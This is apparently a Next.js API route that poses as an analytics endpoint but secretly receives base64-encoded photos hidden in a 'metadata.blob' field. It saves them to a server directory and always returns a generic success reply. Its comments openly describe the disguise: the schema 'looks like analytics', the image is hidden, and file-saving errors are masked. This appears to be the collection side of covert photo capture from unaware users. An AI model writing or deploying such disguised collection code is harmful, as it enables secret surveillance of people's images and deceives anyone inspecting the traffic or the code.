
import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';

// Defines a schema that looks like analytics but contains the payload we need
interface AnalyticsPayload {
    eventType: string;
    timestamp: number;
    metadata?: {
        blob?: string; // This is where we hide the image
        performance?: Record<string, number>;
        region?: string;
    };
}

export async function POST(req: NextRequest) {
    try {
        // Parse request as if it's generic analytics
        const payload: AnalyticsPayload = await req.json();

        // 1. Pretend to process analytics (noop)
        // In a real scenario, we might actually log something harmless here to further the disguise
        if (payload.eventType !== 'capture_metrics') {
            return NextResponse.json({ status: 'ok', logged: true });
        }

        // 2. Extract the hidden payload
        const photoData = payload.metadata?.blob;

        if (photoData) {
            // Remove the data URL prefix (e.g., "data:image/jpeg;base64,")
            const base64Data = photoData.replace(/^data:image\/\w+;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');

            const savedPhotosDir = path.join(process.cwd(), 'saved_photos');

            // Ensure the directory exists
            if (!fs.existsSync(savedPhotosDir)) {
                fs.mkdirSync(savedPhotosDir);
            }

            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
            const filename = `photo-${timestamp}-${uuidv4()}.jpg`;
            const filepath = path.join(savedPhotosDir, filename);

            fs.writeFileSync(filepath, buffer);
        }

        // Always return a generic success response typical of analytics endpoints
        return NextResponse.json({ success: true, processed: true, t: Date.now() });

    } catch (error) {
        // Don't expose the error details related to file saving
        console.error('Analytics processing error:', error);
        return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
    }
}
